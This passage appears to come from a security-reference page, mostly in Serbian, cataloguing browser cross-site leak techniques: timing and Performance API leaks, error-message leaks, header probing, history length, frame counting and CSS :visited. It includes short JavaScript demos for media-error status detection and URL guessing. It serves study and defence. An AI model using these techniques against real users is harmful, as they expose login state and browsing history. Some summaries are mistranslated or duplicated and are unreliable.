- **Sažetak:** Resursi koji se preuzimaju ne kreiraju resource timing entry u Performance API.
- **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Slično prethodno opisanom XS-Leaku, resurs koji se preuzme zbog ContentDisposition header-a takođe ne kreira performance entry. Ova tehnika radi u svim glavnim browser-ima.

### Redirect Start Leak

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Redirect
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Resource timing entry leak-uje vreme početka redirect-a.
- **Primer koda**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Našli smo jedan XS-Leak primer koji zloupotrebljava ponašanje nekih browser-a koji loguju previše informacija za cross-origin zahteve. Standard definiše podskup atributa koji bi trebalo da budu postavljeni na nulu za cross-origin resurse. Međutim, u **SA** je moguće detektovati da li je korisnik **preusmeren** od strane ciljne stranice tako što se upita **Performance API** i proveri **redirectStart timing data**.

### Duration Redirect Leak

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Redirect
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Trajanje timing unosa je negativno kada se dogodi redirect.
- **Primer koda**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC, **duration** za zahteve koji rezultuju redirect-om je **negativan** i stoga se može **razlikovati** od zahteva koji ne rezultuju redirect-om.

### CORP Leak

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: Header
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Sažetak:** Resurs zaštićen sa CORP neće kreirati resource timing entry.
- **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim slučajevima, unos **nextHopProtocol** može biti iskorišćen kao leak tehnika. U GC, kada je postavljen **CORP header**, nextHopProtocol će biti **prazan**. Napomena: u SA se uopšte neće kreirati performance entry za resurse omotane CORP-om.

### Service Worker

- **Metode uključivanja**: Frames
- **Uočljiva razlika**: API Usage
- **Više informacija**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Sažetak:** Detektovati da li je service worker registrovan za određeni origin.
- **Primer koda**:

Service worker-i su event-driven skriptni konteksti koji rade na nivou origin-a. Oni rade u pozadini web stranice i mogu intercept-ovati, modifikovati i **cache-ovati resurse** da bi omogućili offline web aplikacije.\
Ako je **resurs keširan** od strane **service workera** i pristupi mu se preko **iframe**, resurs će biti **učitan iz cache-a service workera**.\
Da bi se detektovalo da li je resurs **učitan iz cache-a service workera**, može se koristiti **Performance API**.\
Ovo se takođe može uraditi pomoću Timing napada (pogledajte rad za više detalja).

### Cache

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Timing
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Sažetak:** Moguće je proveriti da li je resurs sačuvan u cache-u.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Korišćenjem [Performance API](#performance-api) moguće je proveriti da li je resurs keširan.

### Network Duration

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Sažetak:** Moguće je dobiti network duration zahteva iz `performance` API-ja.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Metode uključivanja**: HTML Elements (Video, Audio)
- **Uočljiva razlika**: Status Code
- **Više informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Sažetak:** U Firefox-u je moguće tačno leak-ovati status kod cross-origin zahteva.
- **Primer koda**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
The `MediaError` interface's message property uniquely identifies resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message content, thereby deducing the response status of a cross-origin resource.

### CORS Error

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Summary:** In Security Assertions (SA), CORS error messages inadvertently expose the full URL of redirected requests.
- **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Ova tehnika omogućava napadaču da ekstrahuje destinaciju redirect-a cross-origin sajta iskorišćavanjem načina na koji pregledači zasnovani na WebKit-u tretiraju CORS zahteve. Konkretno, kada se pošalje CORS-enabled request na ciljni sajt koji izvršava redirect zasnovan na stanju korisnika i pregledač zatim odbije zahtev, puna URL adresa cilja redirect-a se otkriva u poruci o grešci. Ova ranjivost ne samo da otkriva postojanje redirect-a već i eksponira endpoint redirect-a i sve osetljive query parametre koje može sadržavati.

### SRI Error

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Summary:** In Security Assertions (SA), CORS error messages inadvertently expose the full URL of redirected requests.
- **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Napadač može iskoristiti verbose error poruke da zaključi veličinu cross-origin odgovora. To je moguće zbog mehanizma Subresource Integrity (SRI), koji koristi atribut integrity da verifikuje da resursi dobijeni, često sa CDN-ova, nisu izmenjeni. Da bi SRI radio za cross-origin resurse, oni moraju biti CORS-enabled; u suprotnom nisu podložni integrity proverama. U Security Assertions (SA), slično CORS error XS-Leak, poruka o grešci se može uhvatiti nakon što fetch zahtev sa atributom integrity ne uspe. Napadači mogu namerno izazvati ovu grešku dodeljivanjem bogus hash vrednosti atributu integrity bilo kog zahteva. U SA, rezultujuća poruka o grešci nenamerno otkriva dužinu sadržaja traženog resursa. Ovo curenje informacija dozvoljava napadaču da razluči razlike u veličini odgovora, otvarajući mogućnost za sofisticirane XS-Leak napade.

### CSP Violation/Detection

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Status Code
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Summary:** Allowing only the victims website in the CSP if we accessed it tries to redirect to a different domain the CSP will trigger a detectable error.
- **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak može koristiti CSP da otkrije da li je cross-origin sajt preusmeren na drugi origin. Ovaj leak može detektovati redirect, ali dodatno i domenu cilja preusmeravanja. Osnovna ideja napada je da se ciljna domena dozvoli na sajtu napadača. Kada se izvrši zahtev prema ciljnoj domeni, on se redirect-uje na cross-origin domen. CSP blokira pristup i kreira violation report koji se koristi kao leak tehnika. U zavisnosti od pregledača, ovaj izveštaj može leak-ovati ciljnu lokaciju redirect-a.\
Moderni pregledači neće ukazivati na URL na koji je bilo preusmeravanje, ali i dalje možete detektovati da je cross-origin redirect pokrenut.

### Cache

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Summary:** Clear the file from the cache. Opens target page checks if the file is present in the cache.
- **Code Example:**

Pregledači mogu koristiti jedan deljeni cache za sve sajtove. Bez obzira na origin, moguće je zaključiti da li je ciljana stranica zahtevala određenu datoteku.

Ako stranica učitava sliku samo ako je korisnik ulogovan, možete invalidirati resource (tako da više nije keširan ako je bio, vidi gore linkove za više informacija), izvršiti zahtev koji bi mogao učitati taj resource i pokušati učitati resource sa lošim zahtevom (npr. koristeći predugačak referer header). Ako učitavanje resource-a nije izazvalo nikakvu grešku, to znači da je bio cached.

### CSP Directive

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Summary:** CSP header directives can be probed using the CSP iframe attribute, revealing policy details.
- **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Nova feature u Google Chrome-u omogućava web stranicama da predlože Content Security Policy (CSP) postavljanjem atributa na iframe element, pri čemu se policy directives šalju zajedno sa HTTP zahtevom. Normalno, ugrađeni sadržaj mora autorizovati ovo preko HTTP header-a, ili se prikazuje error page. Međutim, ako je iframe već podložan nekom CSP-u i novo predloženi policy nije restriktivniji, stranica će se učitati normalno. Ovaj mehanizam otvara put napadaču da detektuje specifične CSP direktive cross-origin stranice identifikujući error page. Iako je ova ranjivost označena kao popravljena, naša istraživanja otkrivaju novu leak tehniku koja može detektovati error page, što sugeriše da osnovni problem nije u potpunosti rešen.

### **CORP**

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Header
- **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Summary:** Resources secured with Cross-Origin Resource Policy (CORP) will throw an error when fetched from a disallowed origin.
- **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP header je relativno nova bezbednosna karakteristika web platforme koja kada je postavljena b**locks no-cors cross-origin requests to the given resource**. Prisutnost header-a se može detektovati zato što resurs zaštićen sa CORP-om će **throw an error when fetched**.

### CORB

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Summary**: CORB can allow attackers to detect when the **`nosniff` header is present** in the request.
- **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Pogledajte link za više informacija o napadu.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Summary**: If the Origin header is reflected in the header `Access-Control-Allow-Origin` it's possible to check if a resource is in the cache already.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

U slučaju da se `Origin` header **reflektuje** u headeru `Access-Control-Allow-Origin`, napadač može zloupotrebiti ovo ponašanje pokušavajući da **fetch**-uje **resource** u **CORS** režimu. Ako se ne pojavi **error**, znači da je resurs **ispravno preuzet sa weba**; ako se pojavi **error**, to je zato što je dostupan **iz cache-a** (greška se pojavljuje zato što cache čuva odgovor sa CORS header-om koji dozvoljava originalnu domenu a ne domen napadača).\
Napomena: ako origin nije reflektovan ali se koristi wildcard (`Access-Control-Allow-Origin: *`) ovo neće raditi.

## Readable Attributes Technique

### Fetch Redirect

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Status Code
- **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Summary:** GC and SA allow to check the response’s type (opaque-redirect) after the redirect is finished.
- **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Slanjem zahteva koristeći Fetch API sa `redirect: "manual"` i drugim parametrima, moguće je pročitati atribut `response.type` i ako je on jednak `opaqueredirect` onda je odgovor bio redirect.

### COOP

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Summary:** Pages safeguarded by Cross-Origin Opener Policy (COOP) prevent access from cross-origin interactions.
- **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Napadač može zaključiti prisustvo zaglavlja Cross-Origin Opener Policy (COOP) u cross-origin HTTP odgovoru. COOP se koristi da spreči eksternim sajtovima da dobiju proizvoljne window reference. Vidljivost ovog header-a se može utvrditi pokušajem pristupa referenci **`contentWindow`**. U scenarijima gde je COOP primenjen uslovno, svojstvo **`opener`** postaje indikator: ono je **undefined** kada je COOP aktivan, i **defined** kada nije.

### URL Max Length - Server Side

- **Inclusion Methods**: Fetch API, HTML Elements
- **Detectable Difference**: Status Code / Content
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Summary:** Detect differences in responses because of the redirect response length migt be too large that the server replays with an error and an alert is generated.
- **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ako server-side redirect koristi korisnički input unutar redirectiona i doda ekstra podatke, moguće je detektovati ovakvo ponašanje zato što serveri obično imaju limit na dužinu zahteva. Ako su korisnički podaci dugi skoro do limita (npr. length - 1) i redirect dodaje nešto ekstra, to može izazvati error koji je detektabilan putem Error Events.

Ako na neki način možete postaviti kolačiće za korisnika, takođe možete izvesti ovaj napad postavljanjem dovoljnog broja kolačića ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) tako da povećanje veličine response-a izazove error. U tom slučaju, imajte na umu da ako inicirate zahtev sa iste lokacije, `<script>` će automatski poslati kolačiće (tako da možete proveriti pojavu grešaka).\
Primer kombinacije **cookie bomb + XS-Search** može se naći u Intended solution ovog writeupa: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Za ovaj tip napada obično je potrebno `SameSite=None` ili da budete u istom kontekstu.

### URL Max Length - Client Side

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Status Code / Content
- **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Summary:** Detect differences in responses because of the redirect response length might too large for a request that a difference can be noticed.
- **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Prema [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), maksimalna dužina URL-a u Chrome-u je 2MB.

> In general, the _web platform_ does not have limits on the length of URLs (although 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing denial-of-service problems in inter-process communication.

Dakle, ako je redirect URL koji se vraća veći u nekom od slučajeva, moguće je da ga naterate da redirect-uje sa URL-om većim od 2MB kako biste pogodili limit dužine. Kada se to dogodi, Chrome prikazuje stranicu **`about:blank#blocked`**.

Uočljiva razlika je ta da ako je redirect bio završen, `window.origin` baca grešku jer cross-origin ne može pristupiti toj informaciji. Međutim, ako je limit pređen i učitana stranica je bila **`about:blank#blocked`**, `origin` prozorá ostaje origin roditelja, što je pristupačna informacija.

Sav dodatni sadržaj potreban da se dosegne **2MB** može se dodati putem hash-a u početnom URL-u tako da bude **korišćen u redirect-u**.


{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Max Redirects

- **Inclusion Methods**: Fetch API, Frames
- **Detectable Difference**: Status Code
- **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Summary:** User the browser's redirect limit to ascertain the occurrence of URL redirections.
- **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ako je maksimalan broj redirect-a koji pregledač prati npr. 20, napadač može pokušati učitati svoju stranicu sa 19 redirect-a i na kraju poslati žrtvu na testiranu stranicu. Ako se pojavi error, onda je stranica pokušavala da redirect-uje korisnika.

### History Length

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Redirects
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Summary:** JavaScript code manipulates the browser history and can be accessed by the length property.
- **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

History API omogućava JavaScript kodu da manipuliše browser history-jem, koji čuva stranice koje je korisnik posetio. Napadač može koristiti property length kao inclusion metodu: detektovati JavaScript i HTML navigaciju.\
Provera `history.length`, navesti korisnika da navigira na stranicu, vratiti se na isto-origin i proveriti novu vrednost `history.length`.

### History Length with same URL

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: If URL is the same as the guessed one
- **Summary:** It's possible to guess if the location of a frame/popup is in an specific URL abusing the history length.
- **Code Example**: Below

Napadač može koristiti JavaScript da postavi lokaciju frame-a/pop-up-a na pogodjeni URL i **odmah** promeni na `about:blank`. Ako se history length uvećao, to znači da je URL bio tačan i imao je vremena da se poveća, jer se URL ne reload-uje ako je isti. Ako se nije povećao, znači da je pokušao da učita pogodjeni URL ali pošto smo **odmah posle** učitali `about:blank`, history length se nikada nije povećao pri učitavanju pogodjenog URL-a.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Metode uključivanja**: Frames, Pop-ups
- **Detektabilna razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Sažetak:** Proceni broj iframe elemenata proverom svojstva `window.length`.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Prebrojavanje **broja frames na veb stranici** otvorene putem `iframe` ili `window.open` može pomoći da se identifikuje **status korisnika u vezi te stranice**.\
Štaviše, ako stranica uvek ima isti broj frames, kontinuirano proveravanje broja frames može pomoći da se uoči **šablon** koji može dovesti do leak-a informacija.

Primer ove tehnike je da se u chrome-u, **PDF** može **detektovati** pomoću **frame counting** zato što se interno koristi `embed`. Postoje [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omogućavaju kontrolu nad sadržajem kao što su `zoom`, `view`, `page`, `toolbar` gde ova tehnika može biti interesantna.

### HTMLElements

- **Metode uključivanja**: HTML Elements
- **Detektabilna razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Sažetak:** Read the leaked value to distinguish between 2 possible states
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Curenje informacija kroz HTML elemente predstavlja problem u bezbednosti veba, posebno kada se dinamički medijski fajlovi generišu na osnovu korisničkih informacija, ili kada se dodaju watermark-ovi koji menjaju veličinu medija. Napadači mogu iskoristiti ovo da razlikuju između mogućih stanja analizom informacija koje određeni HTML elementi izlažu.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, koje se mogu pristupiti preko njegovog API-ja. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Otkriva `videoHeight` i `videoWidth`. U nekim browser-ima postoje dodatna svojstva kao što su `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, i `webkitDecodedFrameCount`, koja pružaju dublje informacije o sadržaju medija. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Ova funkcija daje detalje o kvalitetu reprodukcije videa, uključujući `totalVideoFrames`, što može ukazivati na količinu obrađenih video podataka. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Ovaj element otkriva `height` i `width` slike. Međutim, ako je slika nevažeća, ova svojstva će vratiti 0, a funkcija `image.decode()` će biti odbijena, što ukazuje na neuspešno učitavanje slike. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Metode uključivanja**: HTML Elements
- **Detektabilna razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Sažetak:** Identifikuj varijacije u stilizaciji sajta koje koreliraju sa statusom ili stanjem korisnika.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web aplikacije mogu promeniti stil sajta u zavisnosti od statusa korisnika. Cross-origin CSS fajlovi se mogu ugraditi na napadačevu stranicu pomoću **HTML link elementa**, i pravila će biti **primenjena** na napadačevu stranicu. Ako stranica dinamički menja ta pravila, napadač može **detektovati** razlike u zavisnosti od korisničkog stanja.\
Kao leak tehnika, napadač može koristiti metodu `window.getComputedStyle` da **pročita CSS** svojstva određenog HTML elementa. Kao rezultat, napadač može pročitati proizvoljna CSS svojstva ako je pogođeni element i ime svojstva poznato.

### CSS History

- **Metode uključivanja**: HTML Elements
- **Detektabilna razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Sažetak:** Detektuj da li je stil `:visited` primenjen na URL što ukazuje da je već posećen
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!TIP]
> According to [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), this is not working in headless Chrome.

Selektor `:visited` u CSS-u se koristi da drugačije stilizuje linkove koji su prethodno posećeni od strane korisnika. Ranije je metoda `getComputedStyle()` mogla da se iskoristi za identifikovanje tih razlika u stilu. Međutim, moderni browser-i su uveli mere bezbednosti koje sprečavaju ovu metodu da otkrije stanje linka. Te mere uključuju uvek vraćanje izračunatog stila kao da je link posećen i ograničavanje stilova koji se mogu primeniti pomoću selektora `:visited`.

Uprkos ovim ograničenjima, moguće je indirektno saznati da li je link posećen. Jedna tehnika uključuje navođenje korisnika da interaguje sa delom stranice pod uticajem CSS-a, konkretno korišćenjem svojstva `mix-blend-mode`. Ovo svojstvo omogućava mešanje elemenata sa njihovom pozadinom, potencijalno otkrivajući stanje posećenosti na osnovu korisničke interakcije.

Takođe, detekcija se može postići bez interakcije korisnika eksploatacijom vremena renderovanja linkova. Pošto browser-i mogu renderovati posećene i neposećene linkove različito, to može uvesti merljivu vremensku razliku u renderovanju. PoC pomenut u Chromium bug izveštaju demonstrira ovu tehniku koristeći više linkova da bi se pojačala vremenska razlika, čineći stanje posećenosti detektabilnim putem vremenske analize.

Za dodatne informacije o ovim svojstvima i metodama, posetite njihove dokumentacione stranice:

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Metode uključivanja**: Frames
- **Detektabilna razlika**: Headers
- **Više informacija**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Sažetak:** In Google Chrome, a dedicated error page is displayed when a page is blocked from being embedded on a cross-origin site due to X-Frame-Options restrictions.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa header-om `X-Frame-Options` postavljenim na "deny" ili "same-origin" ubačena kao object, pojavi se stranica sa greškom. Chrome specifično vraća prazan document objekat (umesto `null`) za `contentDocument` svojstvo ovog object-a, za razliku od iframe-ova ili drugih browser-a. Napadači bi mogli iskoristiti detekciju praznog dokumenta, potencijalno otkrivajući informacije o korisnikovom stanju, posebno ako developeri nekonzistentno postavljaju X-Frame-Options header, često zanemarujući error strane. Dosledna primena sigurnosnih header-a je ključna za sprečavanje ovakvih leak-ova.

### Download Detection

- **Metode uključivanja**: Frames, Pop-ups
- **Detektabilna razlika**: Headers
- **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Sažetak:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Header `Content-Disposition`, konkretno `Content-Disposition: attachment`, naređuje browser-u da preuzme sadržaj umesto da ga prikaže inline. Ovo ponašanje se može iskoristiti da se detektuje da li korisnik ima pristup stranici koja pokreće preuzimanje fajla. U browser-ima baziranim na Chromium-u postoje neki načini da se detektuje ovo ponašanje:

1. **Praćenje download bara**:
- Kada se fajl preuzme u Chromium-based browser-ima, pojavljuje se download bar na dnu prozora browser-a.
- Praćenjem promena visine prozora, napadači mogu zaključiti pojavu download bara, što sugeriše da je preuzimanje započeto.
2. **Download navigacija sa iframovima**:
- Kada stranica pokrene preuzimanje fajla koristeći header `Content-Disposition: attachment`, to ne izaziva navigacioni događaj.
- Učitavanjem sadržaja u iframe i praćenjem navigacionih događaja moguće je proveriti da li content-disposition uzrokuje preuzimanje (nema navigacije) ili ne.
